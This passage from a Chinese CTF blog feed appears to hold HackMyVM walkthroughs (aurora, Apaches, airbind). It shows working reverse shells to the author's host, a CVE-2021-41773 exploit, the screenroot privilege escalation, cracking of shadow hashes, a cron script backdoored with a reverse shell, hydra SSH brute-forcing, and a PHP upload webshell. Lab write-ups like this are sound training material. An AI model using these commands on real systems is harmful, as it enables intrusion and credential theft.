我们尝试一下代码注入，需要注意他禁用了`&amp;`, `;`, `(`, `)`, `||`, `|`, `&gt;`, `&lt;`, `*`, `?`

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `id`
ping: groups=1000(doro): Name or service not known
```

执行成功，尝试弹shell

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `nc 192.168.205.141 8888 -e /bin/bash` 
```

成功弹了回来

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 57096
id
uid=1000(doro) gid=1000(doro) groups=1000(doro)

```

触发一下稳定 Shell小连招

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

继续提权

```bash
doro@aurora:~$ id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
doro@aurora:~$ sudo -l
[sudo] password for doro: 
sudo: a password is required
doro@aurora:~$ cd /home/doro/
doro@aurora:~$ ls -al
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt
doro@aurora:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount

```

`/usr/bin/screen`这个没见过，看看能不能提权。找到一篇[文章](https://www.exploit-db.com/exploits/41154)，还是利用脚本，更开心了

```bash
doro@aurora:/tmp$ vi screenroot.sh
doro@aurora:/tmp$ chmod +x screenroot.sh 
doro@aurora:/tmp$ bash screenroot.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod('/tmp/rootshell', 04755);
      |     ^~~~~
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp('/bin/sh', NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
uid=0(root) gid=0(root) groups=0(root),1000(doro)

```

成功提权sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_aurora.html</guid><pubDate>Fri, 27 Jun 2025 09:32:32 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPHK.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches

# 0. 简介

**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1. 扫描

首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
Nmap scan report for 192.168.205.143
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。接下来，我们对 HTTP 服务进行进一步的渗透测试。

# 2. 漏洞扫描与利用

通过访问 Web 服务，未发现明显的漏洞。因此，我使用 **feroxbuster** 对靶机进行目录爆破，虽然未获得有效的目录列表，但继续使用 `nuclei` 工具对靶机进行漏洞扫描，最终发现了一个高危漏洞：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u 192.168.205.143
...
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
...
[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773):RCE] [http] [high] http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
...
```

该漏洞为 **[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773)**，是 Apache HTTP 服务器的目录遍历漏洞，能够通过访问特定路径执行命令。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

执行成功后，获取了靶机的基本信息，进一步确认漏洞有效。现在我们执行反弹shell。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1''

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 60584
bash: cannot set terminal process group (651): Inappropriate ioctl for device
bash: no job control in this shell
daemon@apaches:/usr/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

# 3. 获取稳定的 Shell

为了获取一个更加稳定的交互式 shell，执行以下命令：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

这些操作确保了与靶机的连接更为稳定，并为后续的渗透操作提供了良好的基础。

# 4.提权

```bash
daemon@apaches:/usr/bin$ cd /home/
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd geronimo/
daemon@apaches:/home/geronimo$ ls -al
total 32
drwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 .
drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history
-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt
daemon@apaches:/home/geronimo$ cd ..
daemon@apaches:/home$ cd pocahontas/
daemon@apaches:/home/pocahontas$ ls -al
total 36
drwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .
drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt
daemon@apaches:/home/pocahontas$ cd ..
daemon@apaches:/home$ cd sacagawea/
daemon@apaches:/home/sacagawea$ ls -la
total 48
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .
drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
drwxrwxr-x 2 sacagawea sacagawea 4096 Jan 22 06:06 Backup
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt
daemon@apaches:/home/sacagawea$ cd Backup/
daemon@apaches:/home/sacagawea/Backup$ ls -al
total 23128
drwxrwxr-x 2 sacagawea sacagawea     4096 Jan 22 06:06 .
drwxr-xr-x 6 sacagawea sacagawea     4096 Jul 13  2023 ..
-rwx------ 1 sacagawea sacagawea 23673389 Jan 22 06:06 Backup.tar.gz
daemon@apaches:/home/sacagawea/Backup$ cd ..
daemon@apaches:/home/sacagawea$ cd Development/
daemon@apaches:/home/sacagawea/Development$ ls -al
total 68
drwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13  2023 ..
drwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts
drwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images
-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js
-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt
daemon@apaches:/home/sacagawea/Development$ cd ..
daemon@apaches:/home/sacagawea$ cd ..
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd squanto/
daemon@apaches:/home/squanto$ ls -al
total 36
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local
-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt
daemon@apaches:/home/squanto$ cat backup/
cat: backup/: Is a directory
daemon@apaches:/home/squanto$ cd backup/ 
daemon@apaches:/home/squanto/backup$ ls -al
total 8
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 ..
daemon@apaches:/home/squanto/backup$ c d..
c: command not found
daemon@apaches:/home/squanto/backup$ cd ..
daemon@apaches:/home/squanto$ cat todo.md  
### Development

- [x] Apaches frontpage
- [ ] Portal for administration
- [ ] Database selection for administration
- [ ] Hardening the system for attacks
daemon@apaches:/home/squanto$ cd /opt/ 
daemon@apaches:/opt$ ls --la
ls: unrecognized option '--la'
Try 'ls --help' for more information.
daemon@apaches:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
daemon@apaches:/opt$ cd /tmp/
daemon@apaches:/tmp$ ls -al
total 44
drwxrwxrwt 11 root root 4096 Jan 22 06:04 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .Test-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .font-unix
drwx------  3 root root 4096 Jan 22 05:58 snap-private-tmp
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-logind.service-62l80f
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-resolved.service-U7wK0h
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-timesyncd.service-6HVyEh

daemon@apaches:/tmp$ wget 192.168.205.141/linpeas.sh
--2025-01-22 06:10:32--  http://192.168.205.141/linpeas.sh
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824847 (806K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================&gt;] 805.51K  --.-KB/s    in 0.02s   

2025-01-22 06:10:32 (49.1 MB/s) - 'linpeas.sh' saved [824847/824847]

daemon@apaches:/tmp$ chmod +x linpeas.sh 
daemon@apaches:/tmp$ bash linpeas.sh 
═╣ Can I read shadow files? ............. root:*:18375:0:99999:7:::                                                                
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::                                                                                                                                  
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No                                                                                       
═╣ Can I read opasswd file? ............. No                                                                                       
═╣ Can I write in network-scripts? ...... No                                                                                       
═╣ Can I read root folder? .............. No                   
```

我去......我是没想到它`/etc/shadow`是可读的。我们将数据提取出来爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat hash
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::

┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)   
1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor
Use the '--show' option to display all of the cracked passwords reliably
Session aborted

```

我们登录上去，继续提权

```bash
squanto@apaches:/home/sacagawea$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
squanto@apaches:/home/sacagawea$ find / -group Lipan 2&gt;/dev/null
/home/sacagawea/Scripts/backup.sh
squanto@apaches:/home/sacagawea$ cd /home/sacagawea/Scripts/
squanto@apaches:/home/sacagawea/Scripts$ ls -al
total 12
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 ..
-rwxrwx--- 1 sacagawea Lipan      182 Oct 10  2022 backup.sh
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
```

有一个脚本文件，看着就像定时任务，而且我们可以修改，我们加个反弹shell上去

```bash
squanto@apaches:/home/sacagawea/Scripts$ echo 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'' &gt;&gt; backup.sh 
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'
```

我们稍等片刻

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889                                
listening on [any] 8889 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 50796
bash: cannot set terminal process group (48786): Inappropriate ioctl for device
bash: no job control in this shell
sacagawea@apaches:~$ id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

继续提权

```bash
sacagawea@apaches:~$ cd Development/
sacagawea@apaches:~/Development$ ls
ls
admin
css
fonts
images
index.html
js
robots.txt
sacagawea@apaches:~/Development$ cd admin/
sacagawea@apaches:~/Development/admin$ ls
ls
1a-login.php
1b-login.css
2-check.php
3-protect.php
sacagawea@apaches:~/Development/admin$ cat 2-check.php 
&lt;?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST['user']) &amp;&amp; !isset($_SESSION['user'])) {
  // (B1) USERS &amp; PASSWORDS - SET YOUR OWN !
  $users = [
    'geronimo' =&gt; '12u7D9@4IA9uBO4pX9#6jZ3456',
    'pocahontas' =&gt; 'y2U1@8Ie&amp;OHwd^Ww3uAl',
    'squanto' =&gt; '4Rl3^K8WDG@sG24Hq@ih',
    'sacagawea' =&gt; 'cU21X8&amp;uGswgYsL!raXC'
  ];

  // (B2) CHECK &amp; VERIFY
  if (isset($users[$_POST['user']])) {
    if ($users[$_POST['user']] == $_POST['password']) {
      $_SESSION['user'] = $_POST['user'];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION['user'])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION['user'])) {
  header('Location: index.php');
  exit();
}
```

发现了几组用户和密码，我们尝试利用其爆破ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat user              
geronimo
pocahontas
squanto
sacagawea
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat pass
12u7D9@4IA9uBO4pX9#6jZ3456
y2U1@8Ie&amp;OHwd^Ww3uAl
4Rl3^K8WDG@sG24Hq@ih
cU21X8&amp;uGswgYsL!raXC

┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.143 -V -I -u -f -e nsr -t 64

[22][ssh] host: 192.168.205.143   login: pocahontas   password: y2U1@8Ie&amp;OHwd^Ww3uAl
[STATUS] attack finished for 192.168.205.143 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:09

```

我们通过ssh连接上去（建议这样连接，不要要上一个用户切用户，不然它sudo会报错）

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh pocahontas@192.168.205.143

pocahontas@apaches:~$ sudo -l
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
```

![Image](https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e)

可以使用**sudo nano**，我们进行提权

```bash
pocahontas@apaches:~$ sudo -u geronimo /bin/nano
$ bash
geronimo@apaches:/home/pocahontas$ sudo bash -p
root@apaches:/home/pocahontas# id
uid=0(root) gid=0(root) groups=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Apaches.html</guid><pubDate>Fri, 27 Jun 2025 09:32:30 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPHK.github.io/post/hmv_airbind.html</link><description># hmv_airbind

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=airbind
**难度**：黄色
**目标 IP**：192.168.205.212
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
Nmap scan report for 192.168.205.212
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与Wallos 文件上传漏洞**

对 80 端口感兴趣，访问 Web 页面，是个登录网页，扫描一下结构

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.212/login.php
http://192.168.205.212/login.php [200 OK] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.212], PasswordField[password], Title[Wallos - Subscription Tracker]   
```

看有没有漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Wallos
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Wallos &lt; 1.11.2 - File Upload RCE                                                                    | php/webapps/51924.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                         
```

是个文件上传，要登录进去，尝试一下弱密码

`admin`:`admin`就这么水灵灵的进去了

[exploit-db](https://www.exploit-db.com/exploits/51924)想看原版利用的可以在这看,我直接放翻译上来了

```bash
# 漏洞标题：Wallos - 文件上传 RCE（已验证）
# 日期：2024-03-04
# 漏洞作者：sml@lacashita.com
# 供应商主页：https://github.com/ellite/Wallos
# 软件链接：https://github.com/ellite/Wallos
# 版本：&lt; 1.11.2
# 测试平台：Debian 12

Wallos 允许您在创建新订阅时上传图像/徽标。

可以绕过此漏洞来上传恶意 .php 文件。

POC
---

1) 登录应用程序。
2) 转到“新订阅”
3) 上传徽标并选择您的 webshell .php
4) 发出请求，将 Content-Type 更改为 image/jpeg 并添加“GIF89a”，它应该是这样的：

--- SNIP -----------------

POST /endpoints/subscription/add.php HTTP/1.1

主机：192.168.1.44

用户代理：Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

接受：*/*

接受语言：en-US,en;q=0.5

接受编码：gzip，deflate

引用：http://192.168.1.44/

内容类型：multipart/form-data;边界=---------------------------29251442139477260933920738324

来源：http://192.168.1.44

内容长度：7220

连接：关闭

Cookie：theme=light；language=en；PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b；theme=light

-----------------------------29251442139477260933920738324

内容处置：form-data；name='name'

测试

-----------------------------29251442139477260933920738324

内容处置：form-data；name='logo'； filename='revshell.php'

Content-Type: image/jpeg

GIF89a;

&lt;?php
system($_GET['cmd']);
?&gt;

-----------------------------29251442139477260933920738324

